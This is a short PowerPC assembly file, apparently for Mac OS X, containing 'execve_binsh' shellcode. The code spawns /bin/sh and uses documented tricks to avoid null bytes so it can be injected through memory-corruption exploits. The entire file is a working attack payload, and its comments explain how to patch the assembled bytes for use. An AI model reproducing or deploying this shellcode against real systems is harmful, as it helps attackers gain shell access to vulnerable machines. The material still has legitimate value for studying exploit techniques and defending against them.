;;; $Id: ppc-execve.s,v 1.1 2003/03/01 01:10:48 ghandi Exp $
;;; PPC MacOS X (maybe others) shellcode
;;;
;;; After assembly, change bytes 2 and 3 of the 'sc' instruction encoding
;;; from 0x00 to 0xff.
;;;
;;; ghandi < ghandi@mindless.com >
;;;

.globl _execve_binsh
.text
_execve_binsh:
    	;; Don't branch, but do link.  This gives us the location of
	;; our code.  Move the address into GPR 31.
	xor.	r5, r5, r5	; r5 = NULL
	bnel	_execve_binsh
	mflr	r31

	;; Use the magic offset constant 268 because it makes the
        ;; instruction encodings null-byte free.
	addi	r31, r31, 268+36
	addi	r3, r31, -268	; r3 = path

        ;; Create argv[] = {path, 0} in the "red zone" on the stack
	stw	r3, -8(r1)	; argv[0] = path
	stw	r5, -4(r1)	; argv[1] = NULL
	subi	r4, r1, 8	; r4 = {path, 0}

	;; 59 = 30209 >> 9    (trick to avoid null-bytes)
	li	r30, 30209
	srawi	r0, r30, 9	; r0 = 59
	sc			; execve(path, argv, NULL)
path:   .asciz "/bin/sh"